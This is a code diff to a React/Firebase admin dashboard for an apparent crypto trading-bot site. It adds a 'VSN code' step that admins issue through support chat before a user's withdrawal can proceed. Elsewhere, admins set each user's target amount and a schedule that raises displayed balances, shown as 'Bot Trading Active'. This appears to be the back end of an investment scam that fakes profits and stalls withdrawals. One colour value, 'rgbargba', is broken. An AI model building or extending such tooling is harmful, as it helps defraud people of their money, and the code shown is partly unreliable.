@@ -47,7 +47,7 @@ const STATUS_COLORS = {
     label: "Scheduled",
   },
   trading: {
-    bg: "rgba(34,197,94,.15)",
+    bg: "rgbargba(13,148,136,0.1)",
     text: "#22c55e",
     label: "Bot Trading Active",
   },
@@ -67,20 +67,37 @@ export default function AdminDashboard() {
   const [adminUser, setAdminUser] = useState(null);
   const [users, setUsers] = useState([]);
   const [loading, setLoading] = useState(true);
+
+  // ── View state: "main" | "vsn" ──────────────────────────────────────────────
+  const [view, setView] = useState("main");
+
+  // ── Fund state ───────────────────────────────────────────────────────────────
   const [fundSel, setFundSel] = useState(null);
-  const [tgtSel, setTgtSel] = useState(null);
   const [fundAmt, setFundAmt] = useState("");
   const [anaHrs, setAnaHrs] = useState("0");
   const [anaMins, setAnaMins] = useState("45");
   const [fundLoading, setFundLoading] = useState(false);
   const [fundOk, setFundOk] = useState("");
   const [fundErr, setFundErr] = useState("");
+
+  // ── Target state ─────────────────────────────────────────────────────────────
+  const [tgtSel, setTgtSel] = useState(null);
   const [tgtAmt, setTgtAmt] = useState("");
   const [botHrs, setBotHrs] = useState("1");
   const [tgtLoading, setTgtLoading] = useState(false);
   const [tgtOk, setTgtOk] = useState("");
   const [tgtErr, setTgtErr] = useState("");
+
+  // ── Transactions ─────────────────────────────────────────────────────────────
   const [txns, setTxns] = useState([]);
+
+  // ── VSN state ────────────────────────────────────────────────────────────────
+  const [vsnSel, setVsnSel] = useState(null);
+  const [vsnCode, setVsnCode] = useState("");
+  const [vsnLoading, setVsnLoading] = useState(false);
+  const [vsnOk, setVsnOk] = useState("");
+  const [vsnErr, setVsnErr] = useState("");
+
   const navigate = useNavigate();
 
   // ── Auth ────────────────────────────────────────────────────────────────────
@@ -129,11 +146,18 @@ export default function AdminDashboard() {
           incrementSchedule: data.incrementSchedule || [],
           incrementScheduleStartMs: data.incrementScheduleStartMs || 0,
           incrementsApplied: data.incrementsApplied || 0,
+          withdrawalStatus: data.withdrawalStatus || null,
+          pendingWithdrawAmount: data.pendingWithdrawAmount || 0,
+          pendingWithdrawWallet: data.pendingWithdrawWallet || "",
+          vsn_required: data.vsn_required || false,
+          vsn_verified: data.vsn_verified || false,
+          vsn_code: data.vsn_code || "",
         };
       });
       setUsers(list);
       setFundSel((p) => (p ? list.find((u) => u.uid === p.uid) || p : null));
       setTgtSel((p) => (p ? list.find((u) => u.uid === p.uid) || p : null));
+      setVsnSel((p) => (p ? list.find((u) => u.uid === p.uid) || p : null));
     });
     return () => unsub();
   }, [adminUser]);
@@ -170,7 +194,6 @@ export default function AdminDashboard() {
       return;
     }
     const anaExp = Timestamp.fromMillis(now.toMillis() + anaMs);
-
     setFundLoading(true);
     setFundErr("");
     setFundOk("");
@@ -245,7 +268,6 @@ export default function AdminDashboard() {
       setTgtErr("Enter a valid target amount.");
       return;
     }
-
     const now = Timestamp.now();
     const anaExpMs = tgtSel.analysingExpiresAt?.toMillis?.() || 0;
     const isAnalysing =
@@ -253,15 +275,12 @@ export default function AdminDashboard() {
       (tgtSel.botStatus === "analysing" ||
         tgtSel.botStatus === "scheduled" ||
         (anaExpMs && Date.now() < anaExpMs));
-
     setTgtLoading(true);
     setTgtErr("");
     setTgtOk("");
     try {
       const userRef = doc(db, "users", tgtSel.uid);
-
       if (isAnalysing) {
-        // Set pending target — Cloud Function will activate after analysis + grace period
         await updateDoc(userRef, {
           targetAmount: target,
           botHours: hours,
@@ -273,7 +292,6 @@ export default function AdminDashboard() {
           incrementScheduleStartMs: 0,
           incrementsApplied: 0,
         });
-
         await setDoc(doc(collection(db, "adminTransactions")), {
           userId: tgtSel.uid,
           userEmail: tgtSel.email,
@@ -288,17 +306,14 @@ export default function AdminDashboard() {
           adminEmail: adminUser.email,
           note: "Will auto-activate after analysing completes + grace period",
         });
-
         setTgtOk(
           `Scheduled! $${fmt(tgtSel.initialBalance)} → $${fmt(tgtSel.initialBalance + target)} ` +
             `over ${hours}h. Bot activates after analysis finishes.`,
         );
       } else {
-        // Activate immediately if not in analysis phase
         const botExpiresAt = Timestamp.fromMillis(
           now.toMillis() + hours * 3600000,
         );
-
         await updateDoc(userRef, {
           targetAmount: target,
           botActive: true,
@@ -313,7 +328,6 @@ export default function AdminDashboard() {
           incrementScheduleStartMs: now.toMillis(),
           incrementsApplied: 0,
         });
-
         await setDoc(doc(collection(db, "adminTransactions")), {
           userId: tgtSel.uid,
           userEmail: tgtSel.email,
@@ -328,10 +342,8 @@ export default function AdminDashboard() {
           botExpiresAt,
           adminEmail: adminUser.email,
         });
-
         setTgtOk(
-          `Bot activated! $${fmt(tgtSel.initialBalance)} → ` +
-            `$${fmt(tgtSel.initialBalance + target)} over ${hours}h.`,
+          `Bot activated! $${fmt(tgtSel.initialBalance)} → $${fmt(tgtSel.initialBalance + target)} over ${hours}h.`,
         );
       }
       setTgtAmt("");
@@ -346,6 +358,52 @@ export default function AdminDashboard() {
     }
   };
 
+  // ── Send VSN ─────────────────────────────────────────────────────────────────
+  const handleSendVSN = async () => {
+    if (!vsnSel) {
+      setVsnErr("Select a user.");
+      return;
+    }
+    if (!vsnCode.trim() || vsnCode.trim().length < 4) {
+      setVsnErr("Enter a valid VSN code (minimum 4 characters).");
+      return;
+    }
+    setVsnLoading(true);
+    setVsnErr("");
+    setVsnOk("");
+    try {
+      const now = Timestamp.now();
+      await updateDoc(doc(db, "users", vsnSel.uid), {
+        vsn_required: true,
+        vsn_code: vsnCode.trim(),
+        vsn_issued_at: now,
+        vsn_verified: false,
+      });
+      await setDoc(doc(collection(db, "adminTransactions")), {
+        userId: vsnSel.uid,
+        userEmail: vsnSel.email,
+        userName:
+          `${vsnSel.firstName} ${vsnSel.lastName}`.trim() || vsnSel.username,
+        type: "vsn_request",
+        vsn_code: vsnCode.trim(),
+        timestamp: now,
+        status: "pending",
+        adminEmail: adminUser.email,
+      });
+      setVsnOk(
+        `VSN code "${vsnCode.trim()}" generated for ${vsnSel.email}. Share this code with the user via support chat. The user must click "Withdraw" again to enter it.`,
+      );
+      setVsnCode("");
+      setVsnSel(null);
+      setTimeout(() => setVsnOk(""), 8000);
+    } catch (e) {
+      console.error(e);
+      setVsnErr("Failed to generate VSN. Try again.");
+    } finally {
+      setVsnLoading(false);
+    }
+  };
+
   // ── Bot status display ───────────────────────────────────────────────────────
   const getBotStatus = (u) => {
     if (!u.hasBeenFunded)
@@ -354,7 +412,6 @@ export default function AdminDashboard() {
     const exp = u.botExpiresAt?.toMillis?.() || u.botExpiresAt;
     const ana = u.analysingExpiresAt?.toMillis?.() || u.analysingExpiresAt;
     const sch = u.scheduleActivateAt?.toMillis?.() || u.scheduleActivateAt;
-
     if (exp && now > exp)
       return { text: "Bot Trading Disabled", color: "#ef4444", dot: "#ef4444" };
     if (exp && now <= exp)
@@ -395,14 +452,18 @@ export default function AdminDashboard() {
     const now = Date.now();
     const live = users.find((u) => u.uid === t.userId);
     const liveSt = live?.botStatus || "disabled";
-
+    if (t.type === "vsn_request") {
+      const liveUser = users.find((u) => u.uid === t.userId);
+      if (liveUser?.vsn_verified) return "completed";
+      if (liveUser?.vsn_required) return "analysing";
+      return t.status || "pending";
+    }
     if (t.type === "initial_fund") {
       if (liveSt === "disabled" || liveSt === "activated") return "completed";
       const anaExp = t.analysingExpiresAt?.toMillis?.() || t.analysingExpiresAt;
       if (anaExp && now < anaExp) return "analysing";
       return "completed";
     }
-
     if (t.type === "bot_trading") {
       if (t.status === "disabled") return "disabled";
       const exp = t.botExpiresAt?.toMillis?.() || t.botExpiresAt;
@@ -413,7 +474,6 @@ export default function AdminDashboard() {
       if (liveSt === "disabled") return "disabled";
       return t.status || "scheduled";
     }
-
     if (liveSt === "disabled") return "completed";
     return t.status || "completed";
   };
@@ -439,6 +499,12 @@ export default function AdminDashboard() {
     setTgtErr("");
     setTgtOk("");
     setBotHrs("1");
+  };
+  const clearVsn = () => {
+    setVsnSel(null);
+    setVsnCode("");
+    setVsnErr("");
+    setVsnOk("");
   };
 
   if (loading)
@@ -469,6 +535,12 @@ export default function AdminDashboard() {
       </div>
     );
 
+  const pendingWithdrawals = users.filter(
+    (u) => u.withdrawalStatus === "pending_support",
+  );
+  const vsnPending = users.filter((u) => u.vsn_required && !u.vsn_verified);
+  const vsnVerified = users.filter((u) => u.vsn_verified);
+
   const UserCard = ({ user }) => {
     const s = getBotStatus(user);
     return (
@@ -496,6 +568,417 @@ export default function AdminDashboard() {
     );
   };
 
+  // ══════════════════════════════════════════════════════════════════════════════
+  // VSN VIEW (separate full-page view)
+  // ══════════════════════════════════════════════════════════════════════════════
+  if (view === "vsn") {
+    return (
+      <div className="admin-dashboard">
+        {/* Header */}
+        <header className="admin-header">
+          <div className="admin-header-left">
+            <div className="admin-logo">
+              <svg
+                width="22"
+                height="22"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="white"
+                strokeWidth="2"
+              >
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+              </svg>
+            </div>
+            <div>
+              <h1 className="admin-title">Send VSN Code</h1>
+              <p className="admin-email">{adminUser?.email}</p>
+            </div>
+          </div>
+          <button
+            className="btn-back"
+            onClick={() => {
+              clearVsn();
+              setView("main");
+            }}
+          >
+            ← Back to Dashboard
+          </button>
+        </header>
+
+        {/* Pending withdrawal alert */}
+        {pendingWithdrawals.length > 0 && (
+          <div
+            className="alert-banner"
+            style={{
+              background: "rgba(124,92,252,0.12)",
+              borderColor: "rgba(124,92,252,0.3)",
+              color: "#a78bfa",
+            }}
+          >
+            {pendingWithdrawals.length} user(s) waiting for withdrawal support —
+            issue a VSN code below and send it to them via support chat.
+          </div>
+        )}
+
+        <div
+          style={{
+            maxHeight: "1000px",
+            maxWidth: "860px",
+            margin: "32px auto",
+            padding: "0 20px",
+          }}
+        >
+          <div className="card">
+            {/* Info note */}
+            <div
+              style={{
+                background: "rgba(124,92,252,0.08)",
+                border: "1px solid rgba(124,92,252,0.2)",
+                borderRadius: "12px",
+                padding: "14px 16px",
+                marginBottom: "24px",
+              }}
+            >
+              <p
+                style={{
+                  color: "#a78bfa",
+                  fontSize: "13px",
+                  fontWeight: 700,
+                  margin: "0 0 4px",
+                }}
+              >
+                How this works
+              </p>
+              <p
+                style={{
+                  color: "#9ca3af",
+                  fontSize: "13px",
+                  lineHeight: 1.65,
+                  margin: 0,
+                }}
+              >
+                Generate a VSN code for a user who has contacted support.
+              </p>
+            </div>
+
+            {/* Stats row */}
+            <div
+              style={{
+                display: "grid",
+                gridTemplateColumns: "1fr 1fr 1fr",
+                gap: "10px",
+                marginBottom: "24px",
+              }}
+            >
+              {[
+                {
+                  label: "Awaiting Support",
+                  value: pendingWithdrawals.length,
+                  color: "#a78bfa",
+                  bg: "rgba(124,92,252,0.1)",
+                },
+                {
+                  label: "VSN Sent",
+                  value: vsnPending.length,
+                  color: "#f59e0b",
+                  bg: "rgba(245,158,11,0.1)",
+                },
+                {
+                  label: "VSN Verified",
+                  value: vsnVerified.length,
+                  color: "#22c55e",
+                  bg: "rgba(34,197,94,0.1)",
+                },
+              ].map((s) => (
+                <div
+                  key={s.label}
+                  style={{
+                    background: s.bg,
+                    borderRadius: "10px",
+                    padding: "12px 10px",
+                    textAlign: "center",
+                  }}
+                >
+                  <p
+                    style={{
+                      color: s.color,
+                      fontSize: "22px",
+                      fontWeight: 800,
+                      margin: "0 0 4px",
+                    }}
+                  >
+                    {s.value}
+                  </p>
+                  <p
+                    style={{
+                      color: "#6b7280",
+                      fontSize: "10px",
+                      margin: 0,
+                      fontWeight: 600,
+                    }}
+                  >
+                    {s.label}
+                  </p>
+                </div>
+              ))}
+            </div>
+
+            <div className="form-group">
+              <label className="form-label">Select User</label>
+              <select
+                className="form-select"
+                value={vsnSel?.uid || ""}
+                onChange={(e) => {
+                  setVsnSel(
+                    users.find((u) => u.uid === e.target.value) || null,
+                  );
+                  setVsnErr("");
+                }}
+              >
+                <option value="">Choose a user...</option>
+                {users.map((u) => (
+                  <option key={u.uid} value={u.uid}>
+                    {u.email} — ${fmt(u.balance)}
+                    {u.withdrawalStatus === "pending_support"
+                      ? " 🟣 Withdrawal Pending"
+                      : ""}
+                    {u.vsn_required && !u.vsn_verified ? " VSN Sent" : ""}
+                    {u.vsn_verified ? " VSN Verified" : ""}
+                  </option>
+                ))}
+              </select>
+            </div>
+
+            {vsnSel && (
+              <div className="info-box" style={{ marginBottom: "16px" }}>
+                <p className="info-row">
+                  Email: <strong>{vsnSel.email}</strong>
+                </p>
+                <p className="info-row">
+                  Balance: <strong>${fmt(vsnSel.balance)}</strong>
+                </p>
+                {vsnSel.pendingWithdrawAmount > 0 && (
+                  <p className="info-row">
+                    Withdrawal Request:{" "}
+                    <strong style={{ color: "#a78bfa" }}>
+                      ${fmt(vsnSel.pendingWithdrawAmount)}
+                    </strong>
+                  </p>
+                )}
+                {vsnSel.pendingWithdrawWallet && (
+                  <p className="info-row" style={{ wordBreak: "break-all" }}>
+                    Payment Details:{" "}
+                    <strong style={{ color: "#9ca3af", fontSize: "11px" }}>
+                      {vsnSel.pendingWithdrawWallet}
+                    </strong>
+                  </p>
+                )}
+                <p className="info-row">
+                  VSN Status:{" "}
+                  <strong
+                    style={{
+                      color: vsnSel.vsn_verified
+                        ? "#22c55e"
+                        : vsnSel.vsn_required
+                          ? "#f59e0b"
+                          : "#6b7280",
+                    }}
+                  >
+                    {vsnSel.vsn_verified
+                      ? "Verified"
+                      : vsnSel.vsn_required
+                        ? "Awaiting Entry"
+                        : "Not Sent"}
+                  </strong>
+                </p>
+                {vsnSel.vsn_code && !vsnSel.vsn_verified && (
+                  <p className="info-row">
+                    Current VSN:{" "}
+                    <strong
+                      style={{ color: "#f59e0b", letterSpacing: "0.1em" }}
+                    >
+                      {vsnSel.vsn_code}
+                    </strong>
+                  </p>
+                )}
+              </div>
+            )}
+
+            <div className="form-group">
+              <label className="form-label">VSN Code to Generate</label>
+              <input
+                className="form-input"
+                type="text"
+                placeholder="e.g. VSN-4829-XK"
+                value={vsnCode}
+                onChange={(e) => {
+                  setVsnCode(e.target.value);
+                  setVsnErr("");
+                }}
+                style={{
+                  letterSpacing: "0.12em",
+                  fontWeight: 700,
+                  textTransform: "uppercase",
+                }}
+              />
+              <p className="form-hint">
+                After generating,{" "}
+                <strong>
+                  send this code to the user via your support chat
+                </strong>
+                . They will enter it when they click Withdraw again.
+              </p>
+            </div>
+
+            {vsnErr && <div className="alert alert-error">{vsnErr}</div>}
+            {vsnOk && <div className="alert alert-success">{vsnOk}</div>}
+
+            <div className="btn-group">
+              <button
+                className="btn-primary"
+                onClick={handleSendVSN}
+                disabled={vsnLoading || !vsnSel}
+                style={{
+                  background: !vsnSel
+                    ? undefined
+                    : "linear-gradient(135deg,#7C5CFC,#5b3fd4)",
+                  border: "none",
+                }}
+              >
+                {vsnLoading ? (
+                  <>
+                    <span className="spinner" /> Generating...
+                  </>
+                ) : (
+                  "Generate VSN Code"
+                )}
+              </button>
+              <button className="btn-secondary" onClick={clearVsn}>
+                Clear
+              </button>
+            </div>
+          </div>
+
+          {/* Users list for quick reference */}
+          <div className="card" style={{ marginTop: "24px" }}>
+            <h2 className="card-title" style={{ margin: "0 0 14px" }}>
+              Users with Pending Withdrawals
+            </h2>
+            {pendingWithdrawals.length === 0 ? (
+              <p
+                style={{
+                  color: "#6b7280",
+                  textAlign: "center",
+                  padding: "20px 0",
+                  fontSize: "13px",
+                }}
+              >
+                No pending withdrawal requests.
+              </p>
+            ) : (
+              <div className="table-wrap">
+                <table className="admin-table">
+                  <thead>
+                    <tr>
+                      {["User", "Balance", "Requested", "VSN Status"].map(
+                        (h) => (
+                          <th key={h}>{h}</th>
+                        ),
+                      )}
+                    </tr>
+                  </thead>
+                  <tbody>
+                    {pendingWithdrawals.map((u) => (
+                      <tr
+                        key={u.uid}
+                        onClick={() => {
+                          setVsnSel(u);
+                          setVsnErr("");
+                        }}
+                        style={{ cursor: "pointer" }}
+                      >
+                        <td>
+                          <p
+                            style={{
+                              color: "#fff",
+                              fontSize: "12px",
+                              fontWeight: 600,
+                              margin: 0,
+                            }}
+                          >
+                            {u.email}
+                          </p>
+                          <p
+                            style={{
+                              color: "#6b7280",
+                              fontSize: "10px",
+                              margin: 0,
+                            }}
+                          >
+                            @{u.username || "—"}
+                          </p>
+                        </td>
+                        <td className="amount">${fmt(u.balance)}</td>
+                        <td className="amount" style={{ color: "#a78bfa" }}>
+                          ${fmt(u.pendingWithdrawAmount)}
+                        </td>
+                        <td>
+                          {u.vsn_verified ? (
+                            <span
+                              style={{
+                                color: "#22c55e",
+                                fontSize: "11px",
+                                fontWeight: 600,
+                                background: "rgba(34,197,94,0.1)",
+                                padding: "3px 8px",
+                                borderRadius: "6px",
+                              }}
+                            >
+                              Verified
+                            </span>
+                          ) : u.vsn_required ? (
+                            <span
+                              style={{
+                                color: "#f59e0b",
+                                fontSize: "11px",
+                                fontWeight: 600,
+                                background: "rgba(245,158,11,0.1)",
+                                padding: "3px 8px",
+                                borderRadius: "6px",
+                              }}
+                            >
+                              VSN Sent
+                            </span>
+                          ) : (
+                            <span
+                              style={{
+                                color: "#a78bfa",
+                                fontSize: "11px",
+                                fontWeight: 600,
+                                background: "rgba(124,92,252,0.1)",
+                                padding: "3px 8px",
+                                borderRadius: "6px",
+                              }}
+                            >
+                              Needs VSN
+                            </span>
+                          )}
+                        </td>
+                      </tr>
+                    ))}
+                  </tbody>
+                </table>
+              </div>
+            )}
+          </div>
+        </div>
+      </div>
+    );
+  }
+
+  // ══════════════════════════════════════════════════════════════════════════════
+  // MAIN ADMIN VIEW
+  // ══════════════════════════════════════════════════════════════════════════════
   return (
     <div className="admin-dashboard">
       {/* Header */}
@@ -518,15 +1001,102 @@ export default function AdminDashboard() {
             <p className="admin-email">{adminUser?.email}</p>
           </div>
         </div>
-        <button className="btn-back" onClick={() => navigate("/dashboard")}>
-          Back to Site
-        </button>
+        <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
+          {/* VSN button — navigates to VSN view */}
+          <button
+            onClick={() => setView("vsn")}
+            style={{
+              display: "flex",
+              alignItems: "center",
+              gap: "7px",
+              padding: "9px 18px",
+              background:
+                pendingWithdrawals.length > 0
+                  ? "linear-gradient(135deg,#7C5CFC,#5b3fd4)"
+                  : "rgba(124,92,252,0.15)",
+              border: "1.5px solid rgba(124,92,252,0.4)",
+              borderRadius: "10px",
+              color: "#a78bfa",
+              fontSize: "14px",
+              fontWeight: 700,
+              cursor: "pointer",
+              position: "relative",
+            }}
+          >
+            <svg
+              width="16"
+              height="16"
+              viewBox="0 0 24 24"
+              fill="none"
+              stroke="currentColor"
+              strokeWidth="2"
+              strokeLinecap="round"
+              strokeLinejoin="round"
+            >
+              <rect x="3" y="11" width="18" height="11" rx="2" />
+              <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+            </svg>
+            <span
+              style={{
+                color: pendingWithdrawals.length > 0 ? "#fff" : "#a78bfa",
+              }}
+            >
+              Send VSN
+            </span>
+            {pendingWithdrawals.length > 0 && (
+              <span
+                style={{
+                  position: "absolute",
+                  top: "-6px",
+                  right: "-6px",
+                  background: "#ef4444",
+                  color: "#fff",
+                  borderRadius: "50%",
+                  width: "18px",
+                  height: "18px",
+                  fontSize: "10px",
+                  fontWeight: 800,
+                  display: "flex",
+                  alignItems: "center",
+                  justifyContent: "center",
+                }}
+              >
+                {pendingWithdrawals.length}
+              </span>
+            )}
+          </button>
+          <button className="btn-back" onClick={() => navigate("/dashboard")}>
+            Back to Site
+          </button>
+        </div>
       </header>
 
+      {/* Pending target alert */}
       {users.some((u) => u.pendingTarget) && (
         <div className="alert-banner">
-          🟡 {users.filter((u) => u.pendingTarget).length} user(s) scheduled —
-          will auto-activate after analysis + scheduling gap.
+          {users.filter((u) => u.pendingTarget).length} user(s) scheduled — will
+          auto-activate after analysis + scheduling gap.
+        </div>
+      )}
+
+      {/* Pending withdrawal alert */}
+      {pendingWithdrawals.length > 0 && (
+        <div
+          className="alert-banner"
+          style={{
+            background: "rgba(124,92,252,0.12)",
+            borderColor: "rgba(124,92,252,0.3)",
+            color: "#a78bfa",
+          }}
+        >
+          {pendingWithdrawals.length} user(s) waiting for withdrawal support —{" "}
+          <span
+            style={{ textDecoration: "underline", cursor: "pointer" }}
+            onClick={() => setView("vsn")}
+          >
+            click here to issue a VSN code
+          </span>
+          .
         </div>
       )}
 
@@ -786,23 +1356,28 @@ export default function AdminDashboard() {
         {/* ── All Users table ── */}
         <div className="card admin-grid-full">
           <h2 className="card-title" style={{ margin: "0 0 14px" }}>
-            👥 All Users ({users.length})
+            All Users ({users.length})
           </h2>
           <div className="table-wrap table-scroll">
             <table className="admin-table">
               <thead>
                 <tr>
-                  {["User", "Balance", "Target", "Status", "Time Left"].map(
-                    (h) => (
-                      <th key={h}>{h}</th>
-                    ),
-                  )}
+                  {[
+                    "User",
+                    "Balance",
+                    "Target",
+                    "Status",
+                    "Withdraw",
+                    "Time Left",
+                  ].map((h) => (
+                    <th key={h}>{h}</th>
+                  ))}
                 </tr>
               </thead>
               <tbody>
                 {users.length === 0 ? (
                   <tr>
-                    <td colSpan={5} className="table-empty">
+                    <td colSpan={6} className="table-empty">
                       No users found.
                     </td>
                   </tr>
@@ -816,6 +1391,7 @@ export default function AdminDashboard() {
                           setFundSel(u);
                           if (u.hasBeenFunded) setTgtSel(u);
                         }}
+                        style={{ cursor: "pointer" }}
                       >
                         <td>
                           <div className="table-user">
@@ -850,6 +1426,59 @@ export default function AdminDashboard() {
                             {s.text}
                           </span>
                         </td>
+                        <td>
+                          {u.withdrawalStatus === "pending_support" ? (
+                            <span
+                              style={{
+                                color: "#a78bfa",
+                                fontSize: "11px",
+                                fontWeight: 600,
+                                background: "rgba(124,92,252,0.1)",
+                                padding: "3px 8px",
+                                borderRadius: "6px",
+                                cursor: "pointer",
+                              }}
+                              onClick={(e) => {
+                                e.stopPropagation();
+                                setView("vsn");
+                              }}
+                            >
+                              Pending
+                            </span>
+                          ) : u.vsn_required && !u.vsn_verified ? (
+                            <span
+                              style={{
+                                color: "#f59e0b",
+                                fontSize: "11px",
+                                fontWeight: 600,
+                                background: "rgba(245,158,11,0.1)",
+                                padding: "3px 8px",
+                                borderRadius: "6px",
+                              }}
+                            >
+                              VSN Sent
+                            </span>
+                          ) : u.vsn_verified ? (
+                            <span
+                              style={{
+                                color: "#22c55e",
+                                fontSize: "11px",
+                                fontWeight: 600,
+                                background: "rgba(34,197,94,0.1)",
+                                padding: "3px 8px",
+                                borderRadius: "6px",
+                              }}
+                            >
+                              Verified
+                            </span>
+                          ) : (
+                            <span
+                              style={{ color: "#6b7280", fontSize: "11px" }}
+                            >
+                              —
+                            </span>
+                          )}
+                        </td>
                         <td className="time-left">
                           {u.botExpiresAt
                             ? fmtLeft(u.botExpiresAt)
@@ -872,7 +1501,7 @@ export default function AdminDashboard() {
       {/* ── Transactions ── */}
       <div className="card txn-card">
         <h2 className="card-title" style={{ margin: "0 0 14px" }}>
-          📊 Recent Funding Transactions
+          Recent Funding Transactions
         </h2>
         {txns.length === 0 ? (
           <p
@@ -901,10 +1530,27 @@ export default function AdminDashboard() {
               <tbody>
                 {txns.map((t) => {
                   const ls = getTxnStatus(t);
-                  const colors = STATUS_COLORS[ls] || STATUS_COLORS.completed;
-
+                  const vsnColors = {
+                    bg: "rgba(124,92,252,0.15)",
+                    text: "#a78bfa",
+                  };
+                  const colors =
+                    t.type === "vsn_request"
+                      ? {
+                          bg: vsnColors.bg,
+                          text: vsnColors.text,
+                          label: "VSN Request",
+                        }
+                      : STATUS_COLORS[ls] || STATUS_COLORS.completed;
                   let typeLabel = t.type;
-                  if (t.type === "initial_fund") {
+                  if (t.type === "vsn_request") {
+                    typeLabel =
+                      ls === "completed"
+                        ? "VSN Verified"
+                        : ls === "analysing"
+                          ? "VSN Sent"
+                          : "VSN Request";
+                  } else if (t.type === "initial_fund") {
                     typeLabel =
                       ls === "analysing"
                         ? `OmniDev Analysing (${fmtDuration(t.analysingDurationMs)})`
@@ -912,7 +1558,6 @@ export default function AdminDashboard() {
                   } else if (t.type === "bot_trading") {
                     typeLabel = colors.label;
                   }
-
                   return (
                     <tr key={t.id}>
                       <td>
@@ -945,10 +1590,28 @@ export default function AdminDashboard() {
                         </span>
                       </td>
                       <td className="amount">
-                        +${fmt(t.amount || t.initialAmount || 0)}
+                        {t.type === "vsn_request" ? (
+                          <span style={{ color: "#6b7280" }}>—</span>
+                        ) : (
+                          `+$${fmt(t.amount || t.initialAmount || 0)}`
+                        )}
                       </td>
                       <td className="amount">
-                        {t.targetAmount ? `$${fmt(t.targetAmount)}` : "—"}
+                        {t.targetAmount ? (
+                          `$${fmt(t.targetAmount)}`
+                        ) : t.vsn_code ? (
+                          <span
+                            style={{
+                              color: "#a78bfa",
+                              letterSpacing: "0.08em",
+                              fontWeight: 700,
+                            }}
+                          >
+                            {t.vsn_code}
+                          </span>
+                        ) : (
+                          "—"
+                        )}
                       </td>
                       <td className="amount">
                         {t.botHours ? `${t.botHours}h` : "—"}
